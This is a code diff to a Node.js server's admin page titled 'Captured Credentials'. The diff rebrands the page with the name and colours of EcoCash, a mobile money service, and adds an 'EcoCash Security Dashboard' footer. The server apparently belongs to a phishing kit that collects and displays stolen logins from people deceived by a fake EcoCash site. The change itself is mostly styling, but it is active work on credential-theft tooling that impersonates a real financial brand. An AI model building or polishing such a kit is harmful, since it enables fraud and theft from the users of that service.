@@ -393,8 +393,19 @@ http.createServer((req, res) => {
                             border-bottom: 1px solid #eee;
                         }
                         h1 {
-                            color: #d32f2f;
-                            margin-bottom: 10px;
+                            font-size: 32px;
+                            font-weight: 700;
+                            margin-bottom: 5px;
+                        }
+                        h1 .eco {
+                            color: #1a73e8;
+                        }
+                        h1 .cash {
+                            color: #ff1744;
+                        }
+                        .sub-title {
+                            color: #666;
+                            font-size: 14px;
                         }
                         .warning {
                             background: #fff3e0;
@@ -566,12 +577,24 @@ http.createServer((req, res) => {
                             color: #1a73e8;
                             text-decoration: none;
                         }
+                        .brand-footer {
+                            margin-top: 10px;
+                            font-weight: 600;
+                            font-size: 14px;
+                        }
+                        .brand-footer .eco {
+                            color: #1a73e8;
+                        }
+                        .brand-footer .cash {
+                            color: #ff1744;
+                        }
                     </style>
                 </head>
                 <body>
                     <div class="container">
                         <header>
-                            <h1>📋 Captured Credentials</h1>
+                            <h1><span class="eco">Eco</span><span class="cash">Cash</span></h1>
+                            <p class="sub-title">📋 Captured Credentials</p>
                             <p>Access restricted to administrators only</p>
                             <p class="live-update"><span class="dot"></span> Live updates every 30 seconds</p>
                         </header>
@@ -611,6 +634,9 @@ http.createServer((req, res) => {
                             Server: ${req.headers.host} | Last updated: ${new Date().toLocaleString()}
                             <br>
                             <span class="logout-link">🔐 Logged in as: ${ADMIN_USERNAME} | <a href="#" onclick="location.href='/admin?logout=true';location.reload();">Logout</a></span>
+                            <div class="brand-footer">
+                                <span class="eco">Eco</span><span class="cash">Cash</span> Security Dashboard
+                            </div>
                         </footer>
                     </div>
                     
